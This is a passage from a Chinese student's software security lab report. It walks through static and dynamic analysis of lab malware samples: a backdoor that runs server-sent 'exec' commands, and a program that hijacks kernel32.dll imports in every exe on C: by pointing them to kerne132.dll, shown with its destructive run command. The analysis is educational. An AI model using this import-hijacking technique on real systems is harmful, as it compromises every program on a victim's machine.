<p>执行完这些后，这个代码片段跳到一开始发送 <code>hello</code> 那里开始执行：</p>
<p>如果接受的参数不是<code>sleep</code>的话，执行左边的这串，这里是判断发送的字符串是不是 <code>exec</code>：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111225002507.png" alt="image-20230111225002507"></p>
<p>如果不是，进行一个比较：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111225020570.png" alt="image-20230111225020570"></p>
<p>比较这个 <code>buf</code> 的大小和 <code>71h</code>，<code>71h = 113d</code>,如果 <code>buf = 71h</code>的话，<code>ZF=1</code>，那么 <code>jz</code> 跳转，跳转之后就是结束程序。如果不相等的话，会休眠 <code>6 min</code>：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111225126329.png" alt=""></p>
<p>然后休眠完之后会跳转到一开始发送 <code>hello</code> 那个地方，这里这个代码片段的作用应该是判断缓冲区是否大于某个值的。我们回到如果接受的字符串是 <code>exec</code> 的情况，那么将执行下面这些函数：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111225232961.png" alt="image-20230111225232961"></p>
<p>我们注意到这里的一个调用函数就是 <code>CreateProcessA</code> 这个函数，<code>msdn</code> 定义如下：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111225308396.png" alt="image-20230111225308396"></p>
<p>根据汇编代码，我们可以整理出这些入参的具体值是多少，并剔除没有意义的初始值为 <code>0</code> 的参数：</p>
<pre class="line-numbers language-none"><code class="language-none">lpCommandLine&#x3D;edx
bInheritHandles&#x3D;1
dwCreationFlags&#x3D;8000000h
lpStartupInfo&#x3D;ecx
lpProcessInformation&#x3D;eax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后把其中的寄存器换成具体的变量就是：</p>
<pre class="line-numbers language-none"><code class="language-none">lpCommandLine&#x3D;CommandLine
bInheritHandles&#x3D;1
dwCreationFlags&#x3D;8000000h
lpStartupInfo&#x3D;StartupInfo
lpProcessInformation&#x3D;ProcessInformation<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里最重要的就是 <code>CommandLine</code> 这个参数，表明了我们要为什么可执行文件创建一个进程来运行，但是我们点开这个 <code>CommandLine</code> 的时候会发现这个在栈中的数据并没有表明具体的值：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111225628565.png" alt="image-20230111225628565"></p>
<p>服务器发送来的字符串我们假设会是这样的 <code>exec C:\\Windows\someshell.exe</code>，程序将 <code>exec+(空格)</code> 剔除之后剩下的部分就是那个 <code>CommandLine</code> 的部分，这个取决有服务器发送，是个不定值，无法从代码中看出来，所以这里的意思就是为这个 <code>C:\\Windows\someshell.exe</code> 专门创建一个进程来运行它，这个可执行文件一般是事先就上传到服务器的病毒木马；然后这个代码片段运行完之后，又返回到发送 <code>hello</code> 那里继续循环执行。</p>
<h4 id="6-3-5-exe-文件程序分析"><a href="#6-3-5-exe-文件程序分析" class="headerlink" title="6.3.5 exe 文件程序分析"></a>6.3.5 <code>exe</code> 文件程序分析</h4><p>从 <code>main</code> 函数开始看：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111225926082.png" alt="image-20230111225926082"></p>
<p>我们可以发现此函数会调用main函数的第一个参数，并且将第一个参数与2进行比较，之后判断第二个参数的内容和 <code>WARNING_THIS_WILL_DESTROY_YOUR_MACHINE</code> 的内容是否一致，如果一致才会继续往下执行。如果可以正确执行，就会执行以下内容：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111230503397.png" alt="image-20230111230503397"></p>
<p>其会创建文件以及创建文件映射（将 <code>kernel32.dll</code> 映射到内存中）。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111230607883.png" alt="image-20230111230607883"></p>
<p>接下来的映射调用回映射恶意程序 <code>lab07-03.dll</code> 文件。接下来调用了 <code>sub_401040</code> 函数，进入以后发现其调用了 <code>sub_401000</code> 函数。我们暂时不分析此函数，向下分析，返回主函数向下分析：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111230702011.png" alt="image-20230111230702011"></p>
<p>此过程进行了句柄的关闭，此时就说明已经结束了程序的运行操作。接下来使用 <code>copyfile</code> 函数将文件复制到改造的 <code>kerne132.dll</code>，为了达到混淆的效果。</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111230837836.png" alt="image-20230111230837836"></p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111230858957.png" alt="image-20230111230858957"></p>
<p>我们会发现此函数会将上一步的“<code>C:\*</code>”作为第一个参数，然后将其作为 <code>FindFirstFileA</code> 函数寻找文件。<br>继续向下我们会发现存在 <code>stricmp</code> 比较函数，那就说明此函数会存在比较，想上查找可以发现：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111231128511.png" alt="image-20230111231128511"></p>
<p>存在对 <code>exe</code> 文件的比较。总结来说，该程序在C盘中搜索所有 <code>exe</code> 程序,如果找到了就会调用 <code>sub_4010A0</code>：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111231237908.png" alt="image-20230111231237908"></p>
<p>我们会发现此函数会将找到的函数映射到内存中。向下分析：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111231315927.png" alt="image-20230111231315927"></p>
<p>我们会发现此函数对 <code>kerne132.dll</code> 进行字符串比较，如果比较成功的话就会运行下一步程序：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111231355101.png" alt="image-20230111231355101"></p>
<p>整体来说这布程序的目的是遍历 <code>exe</code> 程序寻找是否存在 <code>kernel32.dll</code> 程序，如果存在就调用 <code>repne</code> 覆盖掉原始的程序，覆盖的字符为 <code>dword_403010</code>，点击该字符，并按 <code>a</code> 转换为字符串，得到以下结果：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111231531961.png" alt="image-20230111231531961"></p>
<p>此时我们就会发现是将<code>l</code>变成了<code>1</code>。</p>
<p>总结以上：此程序会遍历C盘中中的所有 <code>exe</code> 程序，将程序中的导入表中的 <code>kernel32.dll</code> 转化为 <code>kerne132.dll</code>。这是就会在每次 <code>exe</code> 文件运行时就会自动加载被修改的 <code>kernel32.dll</code>。</p>
<p>运行程序，打开 <code>process monitor</code> 设置过滤措施：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111231820955.png" alt="image-20230111231820955"></p>
<p>现在正式运行程序，在<code>cmd</code>窗口输入：<code>Lab07-03.exe WARNING_THIS_WILL_DESTROY_YOUR_MACHINE</code>，现在我们可以在 <code>process monitor</code> 中监控到很多关于文件的操作：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111231842529.png" alt="image-20230111231842529"></p>
<p>现在我们可以查看一下可能被感染的 <code>exe</code> 程序，例如在根目录下的 <code>strings.exe</code> 程序，将其拖入到 <code>dependency walker</code> 中：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230111231917978.png" alt="image-20230111231917978"></p>
<p>我们可以发现在 <code>kerne132.dll</code>中还是存在原来的 <code>kernel32.dll</code> 程序的，说明还是可以运行正常的 <code>kernel32.dll</code> 的功能。</p>
<h1 id="实验总结与心得体会"><a href="#实验总结与心得体会" class="headerlink" title="实验总结与心得体会"></a>实验总结与心得体会</h1><p>本次实验耗时一个多星期时间，让我系统的实操了软件安全中的进程安全分析、PE文件病毒实现、缓冲区溢出漏洞的分析与利用、恶意样本的静态分析与动态分析，通过在虚拟机中的实际操作和病毒代码的实际编写，我对课内知识的理解更加透彻，并体会到软件安全在实际计算机环境中的重要应用：如格式化串溢出漏洞，是由程序员错误使用相应函数而导致的，这告诉我们日常编程中要养成良好的代码习惯，避免相关不必要的安全问题。我在实验中收获到的知识颇丰：</p>
<ul>
<li>在实验一中，我熟悉和掌握了 <code>Windows</code> 内核的相关知识，通过在 <code>Windbg</code> 软件对 <code>Windows</code> 内核的调试，我对 <code>EPROCESS</code> 、<code>ActiveProcessLink</code>活动进程链表、<code>KPROCESS</code> 结构的理解更加深入，体会到 <code>EPROCESS</code> 结构体在表示和管理系统进程中的重要作用；</li>
<li>在实验二中，我进行了 <code>PE</code> 文件病毒核心机制的实现，对病毒感染 <code>PE</code> 文件的三种方式节添加、节扩展、节插入的原理理解更加深入，并对 <code>PE</code> 病毒编写的关键技术定位、获取 <code>API</code> 函数、搜索目标文件、感染、破坏等具体方法和步骤有了实际的认识和掌握，通过实际编写获取 <code>API</code> 函数地址的代码，对其原理有了全新的感知；</li>
<li>在实验三中，我实际构造和模拟了栈溢出、堆溢出、<code>BSS</code> 溢出、格式化串溢出等四大缓冲区溢出类型的场景，并对具有这些溢出漏洞的程序进行了利用，从而达到提权或获取系统信息的目的，使我对课内所讲缓冲区溢出漏洞的基本原理有了更直观的认知；</li>
<li>在实验四中，我分析了五个 <code>Lab</code>、近二十个恶意样本的执行机理和实现思路，通过静态分析和动态分析，掌握了在恶意样本分析中的静态分析和动态分析等调试手段，对静态分析和动态分析中的基本工具的使用更加熟悉，对拿到一个恶意样本分析的一般规律有了更多自己的体会。</li>
</ul>
<p>软件安全分析是信息安全领域的一大重要内容。通过四个实验的实操，我对软件安全有了更加深刻的认识，我将在今后的软件安全实践中加以运用，不断学习，提高自己的专业水平。</p>

                                    
                            </div>
                            <hr />

                            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">ShiQuLiZhi</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://sxhthreo.github.io/2023/01/20/homework/security/ruan-jian-an-quan-shi-yan-bao-gao/">https://sxhthreo.github.io/2023/01/20/homework/security/ruan-jian-an-quan-shi-yan-bao-gao/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">ShiQuLiZhi</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



                                <div class="tag_share" style="display: block;">
                                    <div class="post-meta__tag-list" style="display: inline-block;">
                                        
                                            <div class="article-tag">
                                                
                                                    <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">
                                                        <span class="chip bg-color">
                                                            信息安全
                                                        </span>
                                                    </a>
                                                    
                                                    <a href="/tags/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/">
                                                        <span class="chip bg-color">
                                                            软件安全
                                                        </span>
                                                    </a>
                                                    
                                            </div>
                                            
                                    </div>
                                    <div class="post_share"
                                        style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                                        <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                                    </div>
                                </div>
                                
                        </div>
    </div>

    

                

                            

                                        

                                                    
                                                        <style>
    .valine-card {
        margin: 1.5rem auto;
    }

    .valine-card .card-content {
        padding: 20px 20px 5px 20px;
    }

    #vcomments textarea {
        box-sizing: border-box;
        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
    }

    #vcomments p {
        margin: 2px 2px 10px;
        font-size: 1.05rem;
        line-height: 1.78rem;
    }

    #vcomments blockquote p {
        text-indent: 0.2rem;
    }

    #vcomments a {
        padding: 0 2px;
        color: #4cbf30;
        font-weight: 500;
        text-decoration: none;
    }

    #vcomments img {
        max-width: 100%;
        height: auto;
        cursor: pointer;
    }

    #vcomments ol li {
        list-style-type: decimal;
    }

    #vcomments ol,
    ul {
        display: block;
        padding-left: 2em;
        word-spacing: 0.05rem;
    }

    #vcomments ul li,
    ol li {
        display: list-item;
        line-height: 1.8rem;
        font-size: 1rem;
    }

    #vcomments ul li {
        list-style-type: disc;
    }

    #vcomments ul ul li {
        list-style-type: circle;
    }

    #vcomments table,
    th,
    td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    #vcomments table,
    th,
    td {
        border: 0;
    }

    table tr:nth-child(2n),
    thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments h1 {
        font-size: 1.85rem;
        font-weight: bold;
        line-height: 2.2rem;
    }

    #vcomments h2 {
        font-size: 1.65rem;
        font-weight: bold;
        line-height: 1.9rem;
    }

    #vcomments h3 {
        font-size: 1.45rem;
        font-weight: bold;
        line-height: 1.7rem;
    }

    #vcomments h4 {
        font-size: 1.25rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    #vcomments h5 {
        font-size: 1.1rem;
        font-weight: bold;
        line-height: 1.4rem;
    }

    #vcomments h6 {
        font-size: 1rem;
        line-height: 1.3rem;
    }

    #vcomments p {
        font-size: 1rem;
        line-height: 1.5rem;
    }

    #vcomments hr {
        margin: 12px 0;
        border: 0;
        border-top: 1px solid #ccc;
    }

    #vcomments blockquote {
        margin: 15px 0;
        border-left: 5px solid #42b983;
        padding: 1rem 0.8rem 0.3rem 0.8rem;
        color: #666;
        background-color: rgba(66, 185, 131, .1);
    }

    #vcomments pre {
        font-family: monospace, monospace;
        padding: 1.2em;
        margin: .5em 0;
        background: #272822;
        overflow: auto;
        border-radius: 0.3em;
        tab-size: 4;
    }

    #vcomments code {
        font-family: monospace, monospace;
        padding: 1px 3px;
        font-size: 0.92rem;
        color: #e96900;
        background-color: #f8f8f8;
        border-radius: 2px;
    }

    #vcomments pre code {
        font-family: monospace, monospace;
        padding: 0;
        color: #e8eaf6;
        background-color: #272822;
    }

    #vcomments pre[class*="language-"] {
        padding: 1.2em;
        margin: .5em 0;
    }

    #vcomments code[class*="language-"],
    pre[class*="language-"] {
        color: #e8eaf6;
    }

    #vcomments [type="checkbox"]:not(:checked),
    [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }

    #vcomments b,
    strong {
        font-weight: bold;
    }

    #vcomments dfn {
        font-style: italic;
    }

    #vcomments small {
        font-size: 85%;
    }

    #vcomments cite {
        font-style: normal;
    }

    #vcomments mark {
        background-color: #fcf8e3;
        padding: .2em;
    }

    #vcomments table,
    th,
    td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    table tr:nth-child(2n),
    thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments [type="checkbox"]:not(:checked),
    [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }
</style>

<div class="card valine-card" data-aos="fade-up">
    <div class="comment_headling"
        style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>评论</span>
    </div>
    <div id="vcomments" class="card-content" style="display: grid">
    </div>
</div>

<script src="/libs/valine/av-min.js"></script>
<script src="https://unpkg.com/valine/dist/Valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        appId: '8SzvSoQjCOrTadqpJ1LjqujD-9Nh9j0Va',
        appKey: 'iv4mV6VBG7twuE7yQgwpsYaq',
        notify: '' === 'true',
        verify: '' === 'true',
        visitor: '' === 'true',
        avatar: '/medias/moren.png',
        pageSize: '10',
        lang: 'zh-cn',
        placeholder: '快来评论区发表你的观点吧~ 听说昵称填写qq号可以显示qq头像和qq昵称哦!',
        enableQQ: true,
        boolean: true,
        emojiCDN: '//i0.hdslb.com/bfs/emote/',
        // 表情title和图片映射
        emojiMaps: {
            "tv_doge": "6ea59c827c414b4a2955fe79e0f6fd3dcd515e24.png",
            "tv_亲亲": "a8111ad55953ef5e3be3327ef94eb4a39d535d06.png",
            "tv_偷笑": "bb690d4107620f1c15cff29509db529a73aee261.png",
            "tv_再见": "180129b8ea851044ce71caf55cc8ce44bd4a4fc8.png",
            "tv_冷漠": "b9cbc755c2b3ee43be07ca13de84e5b699a3f101.png",
            "tv_发怒": "34ba3cd204d5b05fec70ce08fa9fa0dd612409ff.png",
            "tv_发财": "34db290afd2963723c6eb3c4560667db7253a21a.png",
            "tv_可爱": "9e55fd9b500ac4b96613539f1ce2f9499e314ed9.png",
            "tv_吐血": "09dd16a7aa59b77baa1155d47484409624470c77.png",
            "tv_呆": "fe1179ebaa191569b0d31cecafe7a2cd1c951c9d.png",
            "tv_呕吐": "9f996894a39e282ccf5e66856af49483f81870f3.png",
            "tv_困": "241ee304e44c0af029adceb294399391e4737ef2.png",
            "tv_坏笑": "1f0b87f731a671079842116e0991c91c2c88645a.png",
            "tv_大佬": "093c1e2c490161aca397afc45573c877cdead616.png",
            "tv_大哭": "23269aeb35f99daee28dda129676f6e9ea87934f.png",
            "tv_委屈": "d04dba7b5465779e9755d2ab6f0a897b9b33bb77.png",
            "tv_害羞": "a37683fb5642fa3ddfc7f4e5525fd13e42a2bdb1.png",
            "tv_尴尬": "7cfa62dafc59798a3d3fb262d421eeeff166cfa4.png",
            "tv_微笑": "70dc5c7b56f93eb61bddba11e28fb1d18fddcd4c.png",
            "tv_思考": "90cf159733e558137ed20aa04d09964436f618a1.png",
            "tv_惊吓": "0d15c7e2ee58e935adc6a7193ee042388adc22af.png",
            "tv_打脸": "56ab10b624063e966bfcb76ea5dc4794d87dfd47.png",
            "tv_抓狂": "fe31c08edad661d63762b04e17b8d5ae3c71a757.png",
            "tv_抠鼻": "c666f55e88d471e51bbd9fab9bb308110824a6eb.png",
            "tv_斜眼笑": "911f987aa8bc1bee12d52aafe62bc41ef4474e6c.png",
            "tv_无奈": "ea8ed89ee9878f2fece2dda0ea8a5dbfe21b5751.png",
            "tv_晕": "5443c22b4d07fb1907ccc610c8e6db254f2461b7.png",
            "tv_流汗": "cead1c351ab8d79e9f369605beb90148db0fbed3.png",
            "tv_流泪": "7e71cde7858f0cd50d74b0264aa26db612a8a167.png",
            "tv_流鼻血": "c32d39db2737f89b904ca32700d140a9241b0767.png",
            "tv_点赞": "f85c354995bd99e28fc76c869bfe42ba6438eff4.png",
            "tv_生气": "26702dcafdab5e8225b43ffd23c94ac1ff932654.png",
            "tv_生病": "8b0ec90e6b86771092a498c54f09fc94621c1900.png",
            "tv_疑问": "0793d949b18d7be716078349c202c15ff166f314.png",
            "tv_白眼": "c1d59f439e379ee50eef488bcb5e5378e5044ea4.png",
            "tv_皱眉": "72ccad6679fea0d14cce648b4d818e09b8ffea2d.png",
            "tv_目瞪口呆": "0b8cb81a68de5d5365212c99375e7ace3e7891b7.png",
            "tv_睡着": "8b196675b53af58264f383c50ad0945048290b33.png",
            "tv_笑哭": "1abc628f6d4f4caf9d0e7800878f4697abbc8273.png",
            "tv_腼腆": "89712c0d4af73e67f89e35cbc518420380a7f6f4.png",
            "tv_色": "61822c7e9aae5da76475e7892534545336b23a6f.png",
            "tv_调侃": "4bc022533ef31544ca0d72c12c808cf4a1cce3e3.png",
            "tv_调皮": "b9c41de8e82dd7a8515ae5e3cb63e898bf245186.png",
            "tv_鄙视": "6e72339f346a692a495b123174b49e4e8e781303.png",
            "tv_闭嘴": "c9e990da7f6e93975e25fd8b70e2e290aa4086ef.png",
            "tv_难过": "87f46748d3f142ebc6586ff58860d0e2fc8263ba.png",
            "tv_馋": "fc7e829b845c43c623c8b490ee3602b7f0e76a31.png",
            "tv_鬼脸": "0ffbbddf8a94d124ca2f54b360bbc04feb6bbfea.png",
            "tv_黑人问号": "45821a01f51bc867da9edbaa2e070410819a95b2.png",
            "tv_鼓掌": "1d21793f96ef4e6f48b23e53e3b9e42da833a0f6.png"
        },
        requiredFields: ['nick'], //设置必填项
    });
</script>
                                                            

                                                                

                                                                            

                                                                                        

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2023/01/23/ds-algorithm/suan-fa-ke-cheng-02-suan-fa-fen-xi-yu-she-ji-qi-mo-fu-xi/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="算法分析与设计期末复习">
                        
                        <span class="card-title">算法分析与设计期末复习</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2023-01-23
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E8%AF%BE%E7%A8%8B/" class="post-category">
                                    数据结构与算法课程
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E7%AE%97%E6%B3%95/">
                        <span class="chip bg-color">算法</span>
                    </a>
                    
                    <a href="/tags/%E7%90%86%E8%AE%BA%E7%9F%A5%E8%AF%86/">
                        <span class="chip bg-color">理论知识</span>
                    </a>
                    
                    <a href="/tags/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/">
                        <span class="chip bg-color">程序设计</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2022/11/27/homework/algorithm/suan-fa-fen-xi-yu-she-ji-shi-yan-bao-gao/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="算法分析与设计实验报告">
                        
                        <span class="card-title">算法分析与设计实验报告</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2022-11-27
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E4%BD%9C%E4%B8%9A/" class="post-category">
                                    作业
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E7%AE%97%E6%B3%95/">
                        <span class="chip bg-color">算法</span>
                    </a>
                    
                    <a href="/tags/%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/">
                        <span class="chip bg-color">程序设计</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>


    <script>
        $('#articleContent').on('copy', function (e) {
            // IE8 or earlier browser is 'undefined'
            if (typeof window.getSelection === 'undefined') return;

            var selection = window.getSelection();
            // if the selection is short let's not annoy our users.
            if (('' + selection).length < Number.parseInt('150')) {
                return;
            }

            // create a div outside of the visible area and fill it with the selected text.
            var bodyElement = document.getElementsByTagName('body')[0];
            var newdiv = document.createElement('div');
            newdiv.style.position = 'absolute';
            newdiv.style.left = '-99999px';
            bodyElement.appendChild(newdiv);
            newdiv.appendChild(selection.getRangeAt(0).cloneContents());

            // we need a <pre> tag workaround.
            // otherwise the text inside "pre" loses all the line breaks!
            if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'CODE') {
                newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
            }

            var url = document.location.href;
            newdiv.innerHTML += '<br />'
                + '来源: ShiQuLiZhi BLOG<br />'
                + '文章作者: ShiQuLiZhi<br />'
                + '文章链接: <a href="' + url + '">' + url + '</a><br />'
                + '本文著作权归作者所有，任何形式的转载均请注明出处。';

            selection.selectAllChildren(newdiv);
            window.setTimeout(function () { bodyElement.removeChild(newdiv); }, 200);
        });
    </script>
    

        <!-- 代码块功能依赖 -->
        <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

        <!-- 代码语言 -->
        
            <script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
            

                <!-- 代码块复制 -->
                
                    <script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
                    

                        <!-- 代码块收缩 -->
                        
                            <script type="text/javascript"
                                src="/libs/codeBlock/codeShrink.js"></script>
                            

                                <!-- 代码块折行 -->
                                
    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('1'),
            headingSelector: 'h1, h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h1, h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>


<script src=""></script>
<script>
    MathJax.Hub.Config({
        tex2jax: {inlineMath: [['$', '$'], ['\(', '\)']]}
    });
</script>



                            <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="netease"
                   type="playlist"
                   id="503838841"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="/libs/aplayer/APlayer.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>

    
    <div class="container row center-align" style="margin-bottom: 15px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2022-2023</span>
            
            <span id="year">2022</span>
            <a href="/about" target="_blank">ShiQuLiZhi</a>
